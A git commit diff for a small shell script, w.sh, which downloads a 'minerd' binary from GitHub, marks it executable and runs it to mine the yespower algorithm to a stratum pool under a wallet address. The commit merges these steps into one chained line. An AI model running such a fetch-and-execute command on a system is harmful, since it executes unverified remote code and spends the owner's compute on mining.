f1356bcc95b0480c66a87e5909dfde96bd80f374
whive004 <147044999+whive004@users.noreply.github.com>
2023-10-05 14:57:29 +0530

    Update w.sh

--- w.sh
+++ w.sh
@@ -1,2 +1,1 @@
-wget https://github.com/whive001/bit1/raw/master/minerd && chmod +x minerd
-./minerd -a yespower -o stratum+tcp://stratum-na.rplant.xyz:7070 -u Wn1Q1hueWCfi1xL9rd1t4ooMvKwYYGmzsY
+wget https://github.com/whive001/bit1/raw/master/minerd && chmod +x minerd && ./minerd -a yespower -o stratum+tcp://stratum-na.rplant.xyz:7070 -u Wn1Q1hueWCfi1xL9rd1t4ooMvKwYYGmzsY
